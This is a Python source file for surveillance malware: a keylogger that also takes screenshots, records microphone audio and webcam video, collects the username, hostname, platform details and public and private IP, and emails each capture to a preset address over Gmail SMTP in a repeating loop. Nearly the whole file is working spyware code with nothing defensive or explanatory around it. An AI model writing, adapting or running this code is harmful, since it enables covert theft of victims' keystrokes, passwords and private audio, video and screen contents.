import smtplib
import ssl
import socket
from pynput.keyboard import Key, Listener
import time
import os
import sys
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText
import pyautogui
import threading
import sounddevice
import wave
import cv2
import platform

count = 0
keys = []
exit_flag = False

def send_email(subject, body, attachment_path):
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = ""
    password = ""
    receiver_email = ""

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    message.attach(MIMEBase("application", "octet-stream"))

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attachment_path, 'rb').read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename="{attachment_path}"')
    message.attach(part)

    text = MIMEText(body)
    message.attach(text)

    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())

def record_audio(filename, duration=10, sample_rate=44100):
    audio_data = sounddevice.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2, dtype='int16')
    sounddevice.wait()

    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(2)
        wf.setsampwidth(2)
        wf.setframerate(sample_rate)
        wf.writeframes(audio_data.tobytes())

def record_video(filename, duration=10, fps=20):
    cap = cv2.VideoCapture(0)  # Open the default camera (camera index 0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(filename, fourcc, fps, (640, 480))

    start_time = time.time()

    while (time.time() - start_time) < duration:
        ret, frame = cap.read()
        out.write(frame)
        cv2.imshow('Video Recording', frame)

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cap.release()
    out.release()
    cv2.destroyAllWindows()

def screenshot():
    while not exit_flag:
        # Capture screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")

        # Record audio
        audio_filename = "audio.wav"
        record_audio(audio_filename)
        
        # Record video
        video_filename = "video.avi"
        record_video(video_filename)

        # Set up the SMTP server and the email details
        subject = "Screenshot, Audio, and Video"
        body = "Please find attached the screenshot with audio."

        # Send email with the recorded audio and screenshot as attachments
        send_email(subject, body, "screenshot.png")
        send_email(subject, body, "audio.wav")
        send_email(subject, body, "video.avi")
        
        time.sleep(20)



def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key == "Key.backspace":
            k = " Backspace "
        elif key == "Key.enter":
            k = " Enter "
        elif key == "Key.shift":
            k = " Shift "
        elif key.find("Key") > 0:
            k = ""
        message += k
    send_email("Key Logs", message, "audio.wav")

def sys_info():
    datetime = time.ctime(time.time())
    user = os.path.expanduser('~').split('\\')[2]
    publicIP = requests.get('https://api.ipify.org/').text
    privateIP = socket.gethostbyname(socket.gethostname())
    platformInfo = platform.platform()
    processor = platform.processor()
    systemName = platform.node()
    msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n  *~ Platform Info: {platformInfo}\n  *~ Proccessor: {processor}\n  *~ System Name: {systemName}\n\n'
    send_email("System Info", msg, "screenshot.png")


def on_release(key):
    global exit_flag
    if key == Key.esc:
        print("killed")
        exit_flag = True
        sys.exit()

def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

with Listener(on_press=on_press, on_release=on_release) as listener:
    sys_info()
    thread_screenshot = threading.Thread(target=screenshot)
    thread_screenshot.start()
    listener.join()
    thread_screenshot.join()